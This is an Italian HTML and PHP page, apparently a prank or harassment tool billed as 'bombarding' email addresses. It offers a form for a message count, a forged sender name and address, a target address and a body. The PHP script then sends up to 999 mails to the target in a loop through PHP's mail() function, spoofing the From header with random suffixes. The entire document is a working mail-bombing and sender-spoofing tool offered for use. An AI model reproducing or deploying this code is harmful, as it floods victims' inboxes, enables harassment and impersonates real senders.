<!-- This is the CSS which makes the form look the way it does. -->
<html>
<head>
<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Vito la bomba</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Bombarda indirizzi mail con Vito Stasolla" />
	<meta name="author" content="Vito la Roccia" />

  <!-- 
	//////////////////////////////////////////////////////

	FREE HTML5 TEMPLATE 
	DESIGNED & DEVELOPED by FreeHTML5.co
		
	Website: 		http://freehtml5.co/
	Email: 			info@freehtml5.co
	Twitter: 		http://twitter.com/fh5co
	Facebook: 		https://www.facebook.com/fh5co

	//////////////////////////////////////////////////////
	 -->

  	<!-- Facebook and Twitter integration -->
	<meta property="og:title" content="Vito Stasolla il granatiere"/>
	<meta property="og:image" content="/images/logo.png"/>
	<meta property="og:url" content="www.google.com"/>
	<meta property="og:description" content="Lancia le bombe con vito Stasolla!"/>
</head>
<title> Magazzu's masterpiece </title>
<body>
<style type="text/css">
body {
font-family: Arial;
font-size: .9em;
background: url(magazzu.jpg) no-repeat;
background-size: 100%;
}
input {
background: #ECFDCE;
border: 1px solid green;
}
textarea {
background: #ECFDCE;
border: 1px solid green;
}
legend {
border: 1px solid #048DB4;
background: #F0F8FF;
}
 
fieldset {
border: 1px solid #048DB4;
width: 18.7em;
padding-left: 11px;
padding-bottom: 20px;
background: #F0F8FF;
}
<!-- This is the HTML form -->
</style>
<fieldset>
<legend>Magazzu's masterpiece</legend>
<form action="" method="POST">
Quantità:<br>
<input type="text" size="3" name="speed" maxlength="3"><br>
Nome che invia:<br>
<input type="text" size="40" name="name"><br>
Mail di chi invia:<br>
<input type="text" size="40" name="spoof"><br>
Email di chi riceve:<br>
<input type="text" size="40" name="target"><br>
Email di chi riceve la risposta:<br>
<input type="text" size="40" name="reply"><br>
Titolo:<br>
<input type="text"size="40" name="title"><br>
Corpo del messaggio:<br>
<textarea rows="20" cols="42" name="body">
<img src="Inserisci l'indirizzo immagine qui" width="300" height="300">
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>.
</textarea><br>
<p>Scopri come funziona l'inserimento immagini: <a target=_blank href="http://testdivertentionlineita.altervista.org/tutorial.html">qui</a></p>
<p>N.B.: La sfilza di "br" va matenuta semppre al termine del messaggio e serve per andare a capo (usatela anche nel corpo quando volete andare a capo)</p>
<p>Carica un'immagine non presente su internet: <a target=_blank href="http://testdivertentionlineita.altervista.org/uploader.php">qui</a></p>
<input type="submit" value="Submit" name="submit">
<input type="reset" value="Clear">
</form>
</fieldset>
</body>
</html>
<?php
if($_POST['submit']){ //if submit is hit continue...

$name = (stripslashes(trim($_POST['name'])));
$spoof = (stripslashes(trim($_POST['spoof']))); //sanitizes all the user input.
$target = (stripslashes(trim($_POST['target'])));
$reply =  (stripslashes(trim($_POST['reply'])));
$title = str_replace(array("\n", "\r"), '', stripslashes(trim($_POST['title'])));
$body  = (stripslashes(trim($_POST['body'])));

$speed=(stripslashes(trim($_POST['speed'])));
$speed=(int)$speed;

for($i=0; $i<$speed;$i++)
{
	sleep (2);
	$rand=rand(1,500);
	$named=$name.$rand;
	$spoofed=$spoof.$rand;
	
$headers  = "From: $named <$spoofed>\r\n";
$headers .= "Reply-To: $reply\r\n";
$headers .= 'MIME-Version: 1.0' . "\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
mail($target, $title, $body, $headers); //if there are no errors, send the email
}
echo "Buongiorno signori!";
}
else{} //if submit wasn't hit, show the HTML form?>